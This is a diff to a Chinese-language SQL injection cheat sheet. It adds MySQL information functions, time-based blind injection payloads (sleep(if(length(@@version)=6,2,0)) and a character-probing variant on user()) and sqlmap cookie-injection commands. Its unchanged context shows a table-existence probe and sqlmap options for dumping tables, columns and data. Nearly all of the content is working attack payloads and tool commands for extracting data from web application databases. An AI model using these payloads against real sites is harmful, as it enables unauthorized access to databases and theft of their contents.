@@ -1,8 +1,23 @@
 ## 注入   
-工具:Pangolin  
-Havij
-### 手工注入 
+常用函数：
+version() 数据库版本
+@@datadir 数据库路径
+@@version_compile_os
+user()
+database() 数据库名称
+system_user() 系统用户名
+current_user() 当前用户名
+session_user() 连接数据库的用户名
+floor() 取整
+rand() 随机0-1
+concat("abc","123")=abc123
+concat("abc",0x22,"123")=abc"123
 
+### 手工注入 
+#### 延时注入
+select sleep(if(length(@@version)=6,2,0));
+长度为6 sleep 2秒，否则0秒。
+select sleep(if(ord(mid((select user()),1,1))<150,0,2));
 > and exists(select * from admin) 
 >  // 说明存在表明
 
@@ -57,6 +72,8 @@ php+mysql手工注入
 >  post注入
 
 - python SQLmap.py -u "xxxx.com" --cookie "id=xx" --level 2 //判断url是否存在cookie注入
+cookie注入：-u http://xxx.asp --cookie "id=114" --level 2
+
 - `--tables` 爆表
 - `-T 表名 --columns` 爆字段
 - `-T 表名 -C 字段名 -C" "` --dump
